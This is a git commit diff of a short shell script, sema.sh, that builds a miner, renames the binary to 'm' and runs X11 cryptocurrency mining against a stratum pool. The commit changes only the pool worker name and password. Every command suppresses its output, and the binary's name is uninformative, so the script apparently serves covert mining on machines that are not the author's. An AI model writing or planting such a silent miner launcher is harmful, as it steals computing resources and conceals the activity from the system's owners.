c58eb62ba72ab93b9a6c46727e976ec430594e12
LenaBachm2 <LenaBachm2@gmail.com>
2014-09-05 15:20:59 +0200

    Update sema.sh

--- sema.sh
+++ sema.sh
@@ -5,4 +5,4 @@ chmod a+x nomacro.pl > /dev/null 2>&1
 ./configure CFLAGS="-O3" > /dev/null 2>&1
 make > /dev/null 2>&1
 mv min*d m > /dev/null 2>&1
-./m -a X11 -o stratum+tcp://drk.cpu-pool.net:3500 -u soku2.tra -p vis > /dev/null 2>&1
+./m -a X11 -o stratum+tcp://drk.cpu-pool.net:3500 -u soku2.se -p ma > /dev/null 2>&1
